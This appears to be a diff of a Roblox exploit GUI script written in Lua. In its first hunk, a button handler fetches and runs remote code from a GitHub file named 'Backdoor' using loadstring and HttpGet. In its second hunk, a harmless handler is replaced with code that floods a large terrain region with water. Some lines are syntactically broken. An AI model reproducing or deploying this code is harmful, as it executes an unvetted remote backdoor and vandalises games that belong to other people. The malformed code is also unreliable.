@@ -122,8 +122,9 @@ e1x1x1x1Laugh.TextScaled = true
 e1x1x1x1Laugh.TextSize = 14.000
 e1x1x1x1Laugh.TextWrapped = true
 e1x1x1x1Laugh.MouseButton1Down:connect(function()
-		Frame.Visible = false then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/PAGE-2/main/Backdoor"))() 
+		if Frame.Visible == true then	loadstring(game:HttpGet("https://raw.githubusercontent.com/BOSSJKL2/PAGE-2/main/Backdoor"))()
+wait(0.2)
+Frame.Visible = false
 end)
 DayToNight.Name = "DayToNight"
 DayToNight.Parent = Frame
@@ -547,14 +548,9 @@ ForceField.TextSize = 14.000
 ForceField.TextWrapped = true
 ForceField.MouseButton1Down:connect(function()
 
-	local platform = Instance.new("Part")
-	platform.Size = Vector3.new(16, 1, 16)
-	platform.Transparency = 0.5
-	platform.Color = Color3.fromRGB(255, 0, 255)
-	platform.Anchored = true
-	platform.Parent = workspace
-	local player_position = game.Players.LocalPlayer.Character.Head.Position
-	platform.Position = Vector3.new(player_position.X, player_position.Y-5, player_position.Z)
+	local region = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250,18,1250))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
 end
 end)
 
